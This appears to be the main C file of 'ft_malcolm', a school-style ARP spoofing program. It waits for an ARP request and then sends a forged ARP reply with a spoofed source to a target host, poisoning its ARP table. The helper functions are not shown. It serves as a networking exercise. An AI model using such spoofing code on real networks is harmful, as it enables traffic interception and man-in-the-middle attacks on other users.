#include "ft_malcolm.h"

void   endprog(int sig)
{
  (void)sig;
  printf("User requested program interruption.\nExiting now...\n");
  close(g_gl.sock);
  close(g_gl.rsock);
  exit(0);
}

int   main(int argc, char *const *argv)
{
  t_arp           pkt;
  struct sockaddr sa;
  char            *addr;

  if (argc != 5)
  {
    fprintf(stderr, "ft_malcolm: Wrong number of arguments.\n%s\n", "\tusage: ft_malcolm src-ip src-mac target-ip target-mac");
    exit(1);
  }
  if ((addr = network_resolve()) == NULL)
  {
    exit(1);
  }
  signal(SIGINT, &endprog);
  fillpkt_arp(argv, &pkt, &sa, addr);
  while (42)
  {
    if (getpkt_arp() > 0)
    {
        printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
        if (sendto(g_gl.sock, &pkt, sizeof(pkt), 0, &sa, sizeof(sa)) < 0)
        {
          fprintf(stderr, "ft_malcolm: %s\n", "Error sending arp reply with sendto()");
          close(g_gl.sock);
          close(g_gl.rsock);
          exit(1);
        }
        printf("Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...\n");
        close(g_gl.sock);
        close(g_gl.rsock);
        exit(0);
    }
  }
  return (0);
}